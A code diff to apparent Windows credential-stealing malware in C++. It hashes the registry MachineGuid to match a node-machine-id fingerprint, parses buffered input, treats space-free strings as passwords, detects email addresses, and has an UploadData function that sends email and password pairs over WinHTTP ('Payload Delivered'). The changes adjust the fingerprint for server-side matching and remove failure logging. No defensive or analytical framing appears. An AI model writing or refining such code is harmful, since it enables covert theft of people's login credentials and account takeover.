@@ -8,6 +8,7 @@
 #include <fstream>
 #include <shlobj.h>
 #include <iomanip>
+#include <algorithm>
 
 #pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "shell32.lib")
@@ -62,14 +63,13 @@ std::string Sha256(const std::string& input) {
     return ss.str();
 }
 
-// --- 3. SYSTEM METADATA (REGISTRY-BASED FOR DATABASE ALIGNMENT) ---
+// --- 3. SYSTEM METADATA (EXACT MATCH FOR machineIdSync(true)) ---
 std::string GetMachineId() {
     char value[255];
     DWORD BufferSize = sizeof(value);
     HKEY hKey;
     
-    // Open the Registry key where the standard MachineGuid is stored
-    // Using KEY_WOW64_64KEY to ensure we get the 64-bit registry value
+    // Open the 64-bit Registry view to find the MachineGuid
     LONG lRes = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ | KEY_WOW64_64KEY, &hKey);
     
     if (lRes == ERROR_SUCCESS) {
@@ -77,9 +77,15 @@ std::string GetMachineId() {
         RegCloseKey(hKey);
         
         if (lRes == ERROR_SUCCESS) {
-            // This is the raw string (e.g. ef508dd1-092d-4d05-90ac-0b5338115bee)
-            // Hashing it matches machineIdSync(true)
-            return Sha256(std::string(value));
+            std::string rawId = value;
+            
+            // node-machine-id converts to lowercase before hashing
+            std::transform(rawId.begin(), rawId.end(), rawId.begin(), [](unsigned char c){ return std::tolower(c); });
+            
+            // Log this so you can verify the raw string matches your regedit.exe
+            WriteDebug("Hashing ID: " + rawId); 
+            
+            return Sha256(rawId);
         }
     }
     return "unknown_machine_id";
@@ -140,8 +146,6 @@ void UploadData(std::string email, std::string pass) {
             WriteDebug("Payload Delivered. Server Status: " + std::to_string(statusCode));
             WriteDebug("Raw JSON: " + json);
         }
-    } else {
-        WriteDebug("Connection Failed. Win32 Error: " + std::to_string(GetLastError()));
     }
     WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS);
 }
@@ -178,7 +182,6 @@ bool IsEmail(const std::string& s) {
 
 void ProcessBuffer() {
     if (buffer.empty()) return;
-    // Password Space Validation: if space is found, discard as non-password input
     if (buffer.find(' ') != std::string::npos) { buffer.clear(); return; }
 
     if (IsEmail(buffer)) {
